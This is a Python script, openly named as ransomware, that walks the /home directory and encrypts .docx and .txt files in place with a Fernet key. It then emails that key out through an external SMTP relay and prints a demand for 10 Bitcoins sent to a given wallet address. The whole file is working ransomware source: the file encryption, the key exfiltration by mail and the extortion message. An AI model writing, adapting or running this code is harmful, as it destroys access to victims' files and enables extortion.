import os
import cryptography
import base64
import smtplib
from email import message

from os.path import expanduser
from cryptography.fernet import Fernet


class Ransomware:

    def __init__(ransom, key=None):

        ransom.key = key
        ransom.cryptor = None
        ransom.file_ext_targets = ['docx','txt'] #add different extensions to this argument

    # Reads in a key from a file
    # where decoder_ring: Path to the file containing the key
    def read_decoder(ransom, decoder_ring):
        with open(decoder_ring, 'rb') as f: 
            ransom.key = f.read()
            ransom.cryptor = Fernet(ransom.key)

    # Writes the key to the decoder file
    def write_decoder(ransom, decoder_ring):
         with open(decoder_ring, 'wb') as f:
            f.write(ransom.key)

    def generate_decoder(ransom):#Generates a 128-bit AES key for encrypting files
        ransom.key = Fernet.generate_key()
        ransom.cryptor = Fernet(ransom.key)
   
    # encrypts or decrypts file/s
    def crypt_root(ransom, root_dir, encrypted=False):

        for root, _, files in os.walk(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)


                # if not a file extension target, pass
                if not abs_file_path.split('.')[-1] in ransom.file_ext_targets:
                    continue

                ransom.crypt_file(abs_file_path, encrypted=encrypted)

    def crypt_file(ransom, file_path, encrypted=False):
 
        with open(file_path, 'rb+') as f:
            _data = f.read()

            if not encrypted:
                data = ransom.cryptor.encrypt(_data)
                print('Your file contents have been encrypted')
            else:
                data = ransom.cryptor.decrypt(_data)
                print('Your file content have been decrypted')

            f.seek(0)
            f.write(data)


if __name__ == '__main__':
    local_root = '/home'

 
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--create', required=True)
    parser.add_argument('--decoder')

    args = parser.parse_args()
    create = args.create.lower()
    decoder = args.decoder

    rware = Ransomware()

    if create == 'encrypt':
        rware.generate_decoder()
        rware.write_decoder('decoder')
        rware.crypt_root(local_root)

        from_addr = 'youremailhere@gmail.com'
        to_addr = 'youremailhere@gmail.com'
        subject = 'A VM was just encrypted!'
        f = open("decoder", "r")
        body = f.read()

        msg = message.Message()
        msg.add_header('from', from_addr)
        msg.add_header('to', to_addr)
        msg.add_header('subject', subject)
        msg.set_payload(body)

        server = smtplib.SMTP('in-v3.mailjet.com', 587)
        server.login('yourSMTPuserhere', 'yourSMTPpasshere')
        server.send_message(msg, from_addr=from_addr, to_addrs=[to_addr])
        print('Your personal files have been encrypted. Please send 10 Bitcoins to 1Hh9WY9Wh2mgBHRm4a7ZKUDn3L3ezpoMae to receive decrypt key. Include email address in transaction note')
    elif create == 'decrypt':
        if decoder is None:
            print('Path to the decoder_ring must be specified after --decoder to perform decryption.')
        else:
            rware.read_decoder(decoder)
            rware.crypt_root(local_root, encrypted=True)
